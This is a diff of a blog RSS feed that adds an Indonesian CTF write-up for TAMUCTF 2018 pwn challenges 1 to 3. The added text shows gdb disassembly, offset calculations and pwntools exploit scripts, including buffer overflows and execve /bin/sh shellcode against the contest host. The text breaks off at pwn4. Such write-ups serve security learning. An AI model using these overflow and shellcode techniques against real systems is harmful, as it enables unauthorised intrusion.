@@ -6,13 +6,336 @@
 </description>
     <link>https://rhama.my.id/</link>
     <atom:link href="https://rhama.my.id/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 08 Dec 2017 11:31:16 +0700</pubDate>
-    <lastBuildDate>Fri, 08 Dec 2017 11:31:16 +0700</lastBuildDate>
+    <pubDate>Tue, 27 Feb 2018 09:56:19 +0700</pubDate>
+    <lastBuildDate>Tue, 27 Feb 2018 09:56:19 +0700</lastBuildDate>
     <generator>Jekyll v3.2.1</generator>
     
       <item>
+        <title>TAMUCTF 2018 - Pwning</title>
+        <description>&lt;h2 id=&quot;pwn1&quot;&gt;Pwn1&lt;/h2&gt;
+
+&lt;p&gt;Diberikan sebuah file binary dengan informasi sebagai berikut&lt;/p&gt;
+
+&lt;div class=&quot;terminal&quot;&gt;
+  &lt;nav&gt;
+    &lt;a href=&quot;#&quot; class=&quot;close&quot;&gt;close&lt;/a&gt;
+    &lt;a href=&quot;#&quot; class=&quot;minimize&quot;&gt;minimize&lt;/a&gt;
+    &lt;a href=&quot;#&quot; class=&quot;deactivate&quot;&gt;deactivate&lt;/a&gt;
+  &lt;/nav&gt;
+  &lt;h3 class=&quot;title&quot;&gt;Terminal&lt;/h3&gt;
+  &lt;pre&gt;
+&lt;span class=&quot;command&quot;&gt;file pwn1&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;pwn1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=50e68bf77076eb3487d3478631c1659cade5a1bc, not stripped&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;[~/CTF/TAMUCTF 2018/pwn/pwn1]&lt;/span&gt;
+&lt;span class=&quot;command&quot;&gt;checksec pwn1&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;[*] &amp;#39;/media/pwning/dev_urandom/CTF 2017/TAMUCTF 2018/pwn/pwn1/pwn1&amp;#39;&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;Arch:     i386-32-little&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;RELRO:    Partial RELRO&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;Stack:    No canary found&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;NX:       NX enabled&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;PIE:      No PIE (0x8048000)&lt;/span&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Percobaan debugging menggunakan gdb&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;gdb -q pwn1
+Reading symbols from pwn1...&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no debugging symbols found&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...done.
+gdb-peda &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pdisass main 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;!-- &lt;div class=&quot;terminal&quot;&gt;
+  &lt;nav&gt;
+    &lt;a href=&quot;#&quot; class=&quot;close&quot;&gt;close&lt;/a&gt;
+    &lt;a href=&quot;#&quot; class=&quot;minimize&quot;&gt;minimize&lt;/a&gt;
+    &lt;a href=&quot;#&quot; class=&quot;deactivate&quot;&gt;deactivate&lt;/a&gt;
+  &lt;/nav&gt;
+  &lt;h3 class=&quot;title&quot;&gt;Terminal&lt;/h3&gt;
+  &lt;pre&gt;
+&lt;span class=&quot;command&quot;&gt;gdb -q pwn1&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;Reading symbols from pwn1...(no debugging symbols found)...done.&lt;/span&gt;
+&lt;span class=&quot;command&quot;&gt;gdb-peda $ pdisass main &lt;/span&gt;
+&lt;/span&gt;&lt;/pre&gt;
+&lt;/div&gt; --&gt;
+
+&lt;p&gt;Berikut hasil disassable fungsi main&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;   0x080485cf &amp;lt;+29&amp;gt;:    call   0x8048410 &amp;lt;setvbuf@plt&amp;gt;
+   0x080485d4 &amp;lt;+34&amp;gt;:    add    esp,0x10
+   0x080485d7 &amp;lt;+37&amp;gt;:    sub    esp,0xc
+   0x080485da &amp;lt;+40&amp;gt;:    push   0x8048700
+   0x080485df &amp;lt;+45&amp;gt;:    call   0x80483f0 &amp;lt;puts@plt&amp;gt;
+   0x080485e4 &amp;lt;+50&amp;gt;:    add    esp,0x10
+   0x080485e7 &amp;lt;+53&amp;gt;:    sub    esp,0xc
+   0x080485ea &amp;lt;+56&amp;gt;:    push   0x8048720
+   0x080485ef &amp;lt;+61&amp;gt;:    call   0x80483f0 &amp;lt;puts@plt&amp;gt;
+   0x080485f4 &amp;lt;+66&amp;gt;:    add    esp,0x10
+   0x080485f7 &amp;lt;+69&amp;gt;:    sub    esp,0xc
+   0x080485fa &amp;lt;+72&amp;gt;:    push   0x804875f
+   0x080485ff &amp;lt;+77&amp;gt;:    call   0x80483f0 &amp;lt;puts@plt&amp;gt;
+   0x08048604 &amp;lt;+82&amp;gt;:    add    esp,0x10
+   0x08048607 &amp;lt;+85&amp;gt;:    mov    DWORD PTR [ebp-0xc],0x0
+   0x0804860e &amp;lt;+92&amp;gt;:    sub    esp,0xc
+   0x08048611 &amp;lt;+95&amp;gt;:    lea    eax,[ebp-0x23]
+   0x08048614 &amp;lt;+98&amp;gt;:    push   eax
+   0x08048615 &amp;lt;+99&amp;gt;:    call   0x80483d0 &amp;lt;gets@plt&amp;gt;
+   0x0804861a &amp;lt;+104&amp;gt;:   add    esp,0x10
+   0x0804861d &amp;lt;+107&amp;gt;:   cmp    DWORD PTR [ebp-0xc],0xf007ba11
+   0x08048624 &amp;lt;+114&amp;gt;:   jne    0x804862d &amp;lt;main+123&amp;gt;
+   0x08048626 &amp;lt;+116&amp;gt;:   call   0x804854b &amp;lt;print_flag&amp;gt;
+   0x0804862b &amp;lt;+121&amp;gt;:   jmp    0x804863d &amp;lt;main+139&amp;gt;
+   0x0804862d &amp;lt;+123&amp;gt;:   sub    esp,0xc
+   0x08048630 &amp;lt;+126&amp;gt;:   push   0x8048772
+   0x08048635 &amp;lt;+131&amp;gt;:   call   0x80483f0 &amp;lt;puts@plt&amp;gt;
+   0x0804863a &amp;lt;+136&amp;gt;:   add    esp,0x10
+   0x0804863d &amp;lt;+139&amp;gt;:   mov    eax,0x0
+   0x08048642 &amp;lt;+144&amp;gt;:   mov    ecx,DWORD PTR [ebp-0x4]
+   0x08048645 &amp;lt;+147&amp;gt;:   leave  
+   0x08048646 &amp;lt;+148&amp;gt;:   lea    esp,[ecx-0x4]
+   0x08048649 &amp;lt;+151&amp;gt;:   ret    
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Terlihat terdapat penggunaan fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;gets()&lt;/code&gt; yang vulnerable buffer overflow. dan inputan akan disimpan di &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp-0x23&lt;/code&gt;.
+lalu pada terdapat intruksi&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;cmp    DWORD PTR [ebp-0xc],0xf007ba11
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Yang akan membandingkan &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp-0xc&lt;/code&gt; dengan &lt;code class=&quot;highlighter-rouge&quot;&gt;0xf007ba11&lt;/code&gt;. perlu dilakukan overwrite local variable karena &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp-0xc&lt;/code&gt; di inisialisasi dengan nilai 0 &lt;code class=&quot;highlighter-rouge&quot;&gt;mov    DWORD PTR [ebp-0xc],0x0&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Jarak antara &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp-0xc&lt;/code&gt; dan &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp-0x23&lt;/code&gt; adalah 23 bytes.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;gdb-peda$ distance $ebp-0xc $ebp-0x23
+From 0xfffffff4 to 0xffffffdd: -23 bytes, -6 dwords (+1 bytes)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Berikut exploit code yang digunakan&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;secret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf007ba11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pwn.ctf.tamu.edu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4321&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;flag--gigemh0wh4rd1sth4t&quot;&gt;Flag : gigem{H0W_H4RD_1S_TH4T?}&lt;/h3&gt;
+
+&lt;h2 id=&quot;pwn2&quot;&gt;Pwn2&lt;/h2&gt;
+
+&lt;p&gt;Diberikan sebuah file binary dengan informasi berikut&lt;/p&gt;
+
+&lt;div class=&quot;terminal&quot;&gt;
+  &lt;nav&gt;
+    &lt;a href=&quot;#&quot; class=&quot;close&quot;&gt;close&lt;/a&gt;
+    &lt;a href=&quot;#&quot; class=&quot;minimize&quot;&gt;minimize&lt;/a&gt;
+    &lt;a href=&quot;#&quot; class=&quot;deactivate&quot;&gt;deactivate&lt;/a&gt;
+  &lt;/nav&gt;
+  &lt;h3 class=&quot;title&quot;&gt;Terminal&lt;/h3&gt;
+  &lt;pre&gt;
+&lt;span class=&quot;command&quot;&gt;file pwn2&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;pwn2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7bc1a419a4b258706db93ad2f8785e46fdee9636, not stripped&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;[~/CTF/TAMUCTF 2018/pwn]&lt;/span&gt;
+&lt;span class=&quot;command&quot;&gt;checksec pwn2&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;[*] &amp;#39;/media/pwning/dev_urandom/CTF 2017/TAMUCTF 2018/pwn/pwn2&amp;#39;&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;Arch:     i386-32-little&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;RELRO:    Partial RELRO&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;Stack:    No canary found&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;NX:       NX enabled&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;PIE:      No PIE (0x8048000)&lt;/span&gt;
+  &lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Sama seperti pada pwn1, perbedaan nya pwn2 harus &lt;strong&gt;jump&lt;/strong&gt; ke fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;print_flag&lt;/code&gt; yang berada di &lt;code class=&quot;highlighter-rouge&quot;&gt;0804854b&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Untuk mengetahui jumlah pattern untuk overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;EIP&lt;/code&gt;. mengurangi Buffer inputan dengan return address, &lt;code class=&quot;highlighter-rouge&quot;&gt;ebp+0x4&lt;/code&gt; adalah return address untuk 32 bit dan &lt;code class=&quot;highlighter-rouge&quot;&gt;rbp+8&lt;/code&gt; untuk 64 bit.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;gdb-peda$ &lt;/span&gt;distance &lt;span class=&quot;nv&quot;&gt;$ebp&lt;/span&gt;-0xef &lt;span class=&quot;nv&quot;&gt;$ebp&lt;/span&gt;+0x4
+From 0xffffc3d9 to 0xffffc4cc: 243 bytes, 60 dwords &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;+3 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Berikut exploit code nya&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;print_flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x804854b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;243&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;print_flag&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pwn.ctf.tamu.edu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4322&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;flag--gigem3ch0350f7h3p4s7&quot;&gt;Flag : gigem{3ch035_0f_7h3_p4s7}&lt;/h3&gt;
+
+&lt;h2 id=&quot;pwn3&quot;&gt;Pwn3&lt;/h2&gt;
+
+&lt;p&gt;Diberikan sebuah file binary dengan informasi berikut&lt;/p&gt;
+
+&lt;div class=&quot;terminal&quot;&gt;
+  &lt;nav&gt;
+    &lt;a href=&quot;#&quot; class=&quot;close&quot;&gt;close&lt;/a&gt;
+    &lt;a href=&quot;#&quot; class=&quot;minimize&quot;&gt;minimize&lt;/a&gt;
+    &lt;a href=&quot;#&quot; class=&quot;deactivate&quot;&gt;deactivate&lt;/a&gt;
+  &lt;/nav&gt;
+  &lt;h3 class=&quot;title&quot;&gt;Terminal&lt;/h3&gt;
+  &lt;pre&gt;
+&lt;span class=&quot;command&quot;&gt;file pwn3&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;pwn3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5b8bcbe552d4097fbb9a1fe8612c45cfec687a01, not stripped&lt;/span&gt;
+&lt;span class=&quot;command&quot;&gt;checksec pwn3&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;[*] &amp;#39;/media/pwning/dev_urandom/CTF 2017/TAMUCTF 2018/pwn/pwn3&amp;#39;&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;Arch:     i386-32-little&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;RELRO:    Partial RELRO&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;Stack:    No canary found&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;NX:       NX disabled&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;PIE:      No PIE (0x8048000)&lt;/span&gt;
+&lt;span class=&quot;output&quot;&gt;RWX:      Has RWX segments&lt;/span&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Perbedaan pwn3 dan pwn sebelum nya adalah pada pwn3 harus menginjeck &lt;code class=&quot;highlighter-rouge&quot;&gt;Shellcode&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Apabila didebug pada bagian &lt;code class=&quot;highlighter-rouge&quot;&gt;Your random number 0xffa6f2aa!&lt;/code&gt;, random number tersebut adalah lokasi buffer inputan akan disimpan (stack).&lt;/p&gt;
+
+&lt;p&gt;Berikut exploit code nya&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;i386&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pwn.ctf.tamu.edu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4323&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xor eax,eax&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xor ecx,ecx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;push eax&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;push 0x68732f2f&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;push 0x6e69622f&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lea ebx,[esp]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mov al,11&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;int 0x80&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+ 
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Your random number &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;stack_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Stack Addr : {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;242&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;flag--gigemn0ww34r3g377in6s74r73d&quot;&gt;Flag : gigem{n0w_w3_4r3_g377in6_s74r73d}&lt;/h3&gt;
+
+&lt;h2 id=&quot;pwn4&quot;&gt;Pwn4&lt;/h2&gt;
+
+&lt;p&gt;Diberikan sebuah file binary dengan informasi berikut&lt;/p&gt;
+
+&lt;div class=&quot;terminal&quot;&gt;
+  &lt;nav&gt;
